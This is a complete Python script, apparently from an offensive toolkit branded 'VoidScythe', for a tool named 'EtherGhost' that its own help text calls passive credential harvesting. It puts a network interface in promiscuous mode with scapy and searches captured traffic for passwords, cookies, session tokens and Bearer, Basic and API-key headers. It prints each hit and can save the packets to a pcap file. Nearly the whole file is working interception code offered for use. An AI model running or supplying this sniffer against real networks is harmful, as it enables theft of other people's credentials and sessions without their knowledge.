
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DOOM-SEC | VoidScythe | EtherGhost
Author: CyberOps
Version: 3.0.0
"""

from scapy.all import *
import sys
import argparse
import time
import os
import re
from datetime import datetime

# ==============================================================================
# CONFIGURATION & CONSTANTS
# ==============================================================================

VERSION = "3.0.0"
TOOL_NAME = "EtherGhost"

# Keywords that trigger an alert
KEYWORDS = [
    "pass", "password", "user", "username", "login", "admin", "root",
    "cookie", "auth", "token", "key", "secret", "bearer", "session",
    "apikey", "access_key", "passwd", "shadow", "credentials"
]

# Sensitive API patterns
API_PATTERNS = [
    r"Authorization:\s*Bearer\s+([a-zA-Z0-9\-\._~+/]+)",
    r"Basic\s+([a-zA-Z0-9+/=]+)",
    r"x-api-key:\s*([a-zA-Z0-9]+)"
]

# ==============================================================================
# LOGGING FRAMEWORK
# ==============================================================================

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    RED_BG = '\033[41m'

class EtherGhost:
    def __init__(self, interface=None, pcap_file=None, verbose=False, promiscuous=True):
        self.interface = interface
        self.pcap_file = pcap_file
        self.verbose = verbose
        self.promiscuous = promiscuous
        
        self.packet_count = 0
        self.creds_found = 0
        self.start_time = None
        
        # Configure Scapy
        if self.promiscuous:
            conf.sniff_promisc = True

    def print_banner(self):
        banner = f"""{Colors.FAIL}
        ███████╗████████╗██╗  ██╗███████╗██████╗  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
        ██╔════╝╚══██╔══╝██║  ██║██╔════╝██╔══██╗██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
        █████╗     ██║   ███████║█████╗  ██████╔╝██║  ███╗███████║██║   ██║███████╗   ██║   
        ██╔══╝     ██║   ██╔══██║██╔══╝  ██╔══██╗██║   ██║██╔══██║██║   ██║╚════██║   ██║   
        ███████╗   ██║   ██║  ██║███████╗██║  ██║╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   
        ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   
        {Colors.ENDC}{Colors.BOLD}
        [ VoidScythe: EtherGhost v{VERSION} ]
        [ Passive Credential Sniffer & Traffic Analyzer ]
        {Colors.ENDC}"""
        print(banner)

    def analyze_payload(self, payload, src, dst, proto):
        """
        Deep analysis of packet payload strings.
        """
        payload_lower = payload.lower()
        
        # 1. Keyword Searching (Simple)
        for k in KEYWORDS:
            if k in payload_lower:
                self.alert(f"KEYWORD '{k.upper()}' FOUND", src, dst, proto, payload, highlight=k)
                return # Only trigger once per packet to avoid spam

        # 2. Regex Pattern Matching (Advanced)
        for pattern in API_PATTERNS:
            matches = re.findall(pattern, payload, re.IGNORECASE)
            if matches:
                 for m in matches:
                     self.alert("API CREDENTIALS EXTRACTED", src, dst, proto, payload, highlight=m)

    def alert(self, title, src, dst, proto, payload, highlight=None):
        self.creds_found += 1
        print(f"\n{Colors.RED_BG}{Colors.BOLD} [!] {title} [!] {Colors.ENDC}")
        print(f"    {Colors.WARNING}Protocol:{Colors.ENDC} {proto}")
        print(f"    {Colors.WARNING}Source:{Colors.ENDC}   {src}")
        print(f"    {Colors.WARNING}Dest:{Colors.ENDC}     {dst}")
        print(f"    {Colors.WARNING}Time:{Colors.ENDC}     {datetime.now().strftime('%H:%M:%S')}")
        
        print("-" * 60)
        
        # Extract context around findings
        display_text = payload
        if len(payload) > 400:
            if highlight and highlight in payload:
                idx = payload.find(highlight)
                start = max(0, idx - 100)
                end = min(len(payload), idx + 100)
                display_text = "..." + payload[start:end] + "..."
            else:
                display_text = payload[:400] + "..."
        
        # Clean up newlines for display
        display_text = display_text.replace('\r', '').replace('\n', ' ')
        
        # Colorize the hit
        if highlight:
            # Case insensitive replace for display is tricky, simplifying:
            print(f"{Colors.BLUE}{display_text}{Colors.ENDC}")
        else:
            print(f"{Colors.BLUE}{display_text}{Colors.ENDC}")
        
        print("-" * 60)

    def packet_callback(self, packet):
        self.packet_count += 1
        
        # Heartbeat visual
        if self.verbose:
             sys.stdout.write(f"\r[*] Packets: {self.packet_count} | Creds: {self.creds_found}")
             sys.stdout.flush()

        # Save to PCAP if enabled
        if self.pcap_file:
            wrpcap(self.pcap_file, packet, append=True)

        if packet.haslayer(IP):
            src = packet[IP].src
            dst = packet[IP].dst
            
            # TCP/Raw Analysis
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                try:
                    raw_data = packet[Raw].load.decode('utf-8', errors='ignore')
                    
                    # Ignore common noise
                    if self.filter_noise(raw_data):
                        return
                        
                    self.analyze_payload(raw_data, src, dst, "TCP")
                except:
                    pass
            
            # UDP/Raw Analysis (Less common but possible)
            elif packet.haslayer(UDP) and packet.haslayer(Raw):
                try:
                    raw_data = packet[Raw].load.decode('utf-8', errors='ignore')
                    self.analyze_payload(raw_data, src, dst, "UDP")
                except:
                    pass

    def filter_noise(self, data):
        """
        Returns True if packet should be ignored.
        """
        noise = ["<html", "<!DOCTYPE", "text/css", "image/png", "javascript"]
        for n in noise:
            if n in data:
                return True
        return False

    def start(self):
        self.print_banner()
        
        iface_str = self.interface if self.interface else conf.iface
        print(f"{Colors.BLUE}[*] Interface: {iface_str}{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Promiscuous Mode: {self.promiscuous}{Colors.ENDC}")
        
        if self.pcap_file:
            print(f"{Colors.GREEN}[*] Logging to file: {self.pcap_file}{Colors.ENDC}")
            
        print(f"{Colors.BLUE}[*] Sniffing for keywords: {', '.join(KEYWORDS[:5])}...{Colors.ENDC}")
        print(f"{Colors.WARNING}[*] Press CTRL+C to stop.{Colors.ENDC}\n")
        
        self.start_time = datetime.now()
        
        try:
            sniff(
                iface=self.interface, 
                prn=self.packet_callback, 
                store=0,
                filter="ip" # Filter IP traffic only to reduce non-IP noise
            )
        except KeyboardInterrupt:
            self.stop()
        except Exception as e:
            print(f"\n{Colors.FAIL}[!] Critical Sniffer Error: {e}{Colors.ENDC}")
            if "pcap_dnet" in str(e) or "access" in str(e).lower():
                print(f"{Colors.WARNING}    -> Hint: Run as Administrator/Root.{Colors.ENDC}")

    def stop(self):
        duration = datetime.now() - self.start_time
        print(f"\n\n{Colors.BOLD}SNIFFER HALTED{Colors.ENDC}")
        print("-" * 40)
        print(f"Duration: {duration}")
        print(f"Total Packets: {self.packet_count}")
        print(f"Credentials Found: {self.creds_found}")
        if self.pcap_file:
            print(f"PCAP Saved: {self.pcap_file}")

# ==============================================================================
# MAIN ENTRY
# ==============================================================================

def main():
    parser = argparse.ArgumentParser(
        description=f"EtherGhost v{VERSION}",
        epilog="Passive credential harvesting."
    )
    
    parser.add_argument("-i", "--interface", help="Network Interface (e.g., eth0, wlan0)")
    parser.add_argument("-w", "--write", help="Write captured packets to .pcap filename")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show packet counter")
    
    args = parser.parse_args()
    
    ghost = EtherGhost(
        interface=args.interface,
        pcap_file=args.write,
        verbose=args.verbose
    )
    
    try:
        ghost.start()
    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == "__main__":
    main()
